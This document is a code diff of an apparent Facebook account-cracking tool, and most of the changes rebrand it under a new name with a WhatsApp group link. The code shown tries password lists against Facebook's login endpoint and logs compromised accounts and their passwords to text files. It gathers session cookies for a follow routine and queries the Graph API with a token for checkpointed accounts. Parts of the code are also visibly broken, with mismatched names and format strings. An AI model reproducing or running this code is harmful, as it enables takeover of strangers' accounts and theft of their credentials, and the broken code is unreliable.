@@ -98,7 +98,7 @@ def hasil(OK,cp):
 	    pass
 	if len(cp) != 0:
 	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mBILAL_OK.txt' % (H, P, str(len(ok))))
-	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mDogar_CP.txt' % (H, P, str(len(cp))))
+	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97md_CP.txt' % (H, P, str(len(cp))))
 	    input("\x1b[1;97mPress enter to back BILAL Menu ")
 	    Bilal()
 
@@ -117,23 +117,23 @@ def Bilal():
     print(' [w] Join Whatsapp Group ')
     print(' [f] Exit ')
     print('\033[1;97m-----------------------------------------------') 
-    _bilal___ = input(' [\x1b[1;91m?\x1b[1;97m] Select Menu: ')
-    if _bilal___ in ('1', '01'):
-        __xxx__().bilal(id)
+    _sarfraz___ = input(' [\x1b[1;91m?\x1b[1;97m] Select Menu: ')
+    if _sarfraz___ in ('1', '01'):
+        __xxx__().sarfrazx(id)
     if _sarfraz___ in ('2', '02'):
         create_file()
     
-    if _bilal___ in ('3', '03'):
+    if _sarfraz___ in ('3', '03'):
         dupcutter()
-    if _bilal___ in ('4', '04'):
+    if _sarfraz___ in ('4', '04'):
     	pass
     if _sarfraz___ in ('4', '04'):
     	pass
-    os.system("xdg-open https://youtube.com/channel/UCBnvz7l9yDJThaPPEhTVovQ ")
+    os.system("xdg-open https://chat.whatsapp.com/KrEOMUAyO2D83VfjhLHmi2 ")
 class __xxx__:
     def __init__(self):
         self.id = []
-    def bilalx(self,id):
+    def sarfrazx(self,id):
         os.system("clear")
         print(logo)
         self.cnt = input('Put File Name : ')
@@ -149,7 +149,7 @@ class __xxx__:
             self.sarfrazx(id)
     def __metode__(self, user, __chi__, cebok):
         global ok,cp,loop
-        sys.stdout.write(f"\r \x1b[1;97m[Bilal] {loop}|{len(self.id)} OK/CP {len(ok)}/{len(cp)}")
+        sys.stdout.write(f"\r \x1b[1;97m[RamXan] {loop}|{len(self.id)} OK/CP {len(ok)}/{len(cp)}")
         sys.stdout.flush()
         try:
             for pw in __chi__:
@@ -199,11 +199,11 @@ class __xxx__:
                 po = session.post(f"https://{cebok}/login/device-based/validate-password/?shbl=0", data = das, headers = header1, allow_redirects = False)
                 if 'c_user' in session.cookies.get_dict():
                     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                    print(f"\r{H} [Bilal-OK] {user} | {pw}")
+                    print(f"\r{H} [RamXan-OK] {user} | {pw}")
                     wrt = '%s|%s' % (user,pw)
                     ok.append(wrt)
-                    open('Bilal_OK.txt' , 'a').write('%s\n' % wrt)
-                    self.followsession,coki)
+                    open('rmzn_OK.txt' , 'a').write('%s\n' % wrt)
+                    self.follow(session,coki)
                     break
                 elif 'checkpoint' in session.cookies.get_dict():
                     try:
@@ -211,10 +211,10 @@ class __xxx__:
                         cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
                         month, day, year = cp_ttl.split('/')
                         month = bulan_ttl[month]
-                        print('\r%s [Dogar-CP] %s | %s ' % (M, user, pw))
+                        print('\r%s [RamXan-CP] %s | %s ' % (M, user, pw))
                         wrt = '%s|%s' % (user,pw)
                         cp.append(wrt)
-                        open('Dogar_CP.txt' , 'a').write('%s\n' % wrt)
+                        open('rmzn_CP.txt' , 'a').write('%s\n' % wrt)
                         break
                     except (KeyError, IOError):
                         month = ''
@@ -222,10 +222,10 @@ class __xxx__:
                         year  = ''
                     except:
                         pass
-                    print('\r%s [Dogar-CP] %s | %s ' % (M, user, pw))
+                    print('\r%s [RamXan-CP] %s | %s ' % (M, user, pw))
                     wrt = '%s|%s' % (user,pw)
                     cp.append(wrt)
-                    open('Dogar_CP.txt' , 'a').write('%s\n' % wrt)
+                    open('rmzn_CP.txt' , 'a').write('%s\n' % wrt)
                     break
                 else:
                     continue
